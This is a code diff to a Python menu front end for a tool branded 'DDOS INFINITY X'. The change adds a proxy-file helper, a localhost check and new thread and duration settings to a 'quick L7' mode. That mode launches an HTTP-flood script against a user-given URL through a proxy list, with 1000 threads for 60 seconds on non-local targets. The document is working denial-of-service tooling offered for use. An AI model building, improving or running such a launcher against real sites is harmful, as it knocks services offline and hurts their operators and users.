@@ -5,7 +5,11 @@ from __future__ import annotations
 
 import subprocess
 import sys
+from pathlib import Path
 from typing import Iterable, List, Sequence
+
+_SCRIPT_DIR = Path(__file__).resolve().parent
+_START_PY = _SCRIPT_DIR / "start.py"
 
 __brand__ = "DDOS INFINITY X"
 __author__ = "adil fayyaz"
@@ -158,6 +162,19 @@ def show_main_menu(
     _out(f"\n{_SEP}\n")
 
 
+def _ensure_empty_proxy_file() -> None:
+    proxy_dir = _SCRIPT_DIR / "files" / "proxies"
+    proxy_dir.mkdir(parents=True, exist_ok=True)
+    http_txt = proxy_dir / "http.txt"
+    if not http_txt.exists():
+        http_txt.touch()
+
+
+def _is_local_url(url: str) -> bool:
+    u = url.lower()
+    return "127.0.0.1" in u or "localhost" in u or "[::1]" in u
+
+
 def run_quick_l7(
     script: str,
     *,
@@ -171,13 +188,16 @@ def run_quick_l7(
     if l7_set and method not in l7_set:
         method = _default_l7_method(l7 or ())
     if not url:
-        url = _prompt("URL target", "http://")
+        url = _prompt("URL target", "http://127.0.0.1:8080/")
     if not url.startswith(("http://", "https://")):
         url = "http://" + url.lstrip("/")
-    show_attack_banner(method, url, 1000, 60)
+    _ensure_empty_proxy_file()
+    threads = "200" if _is_local_url(url) else "1000"
+    duration = "30" if _is_local_url(url) else "60"
+    show_attack_banner(method, url, int(threads), int(duration))
     _run_script(
-        [method, url, "0", "1000", "http.txt", "10", "60"],
-        script,
+        [method, url, "0", threads, "http.txt", "10", duration],
+        str(_START_PY if _START_PY.exists() else script),
     )
 
 
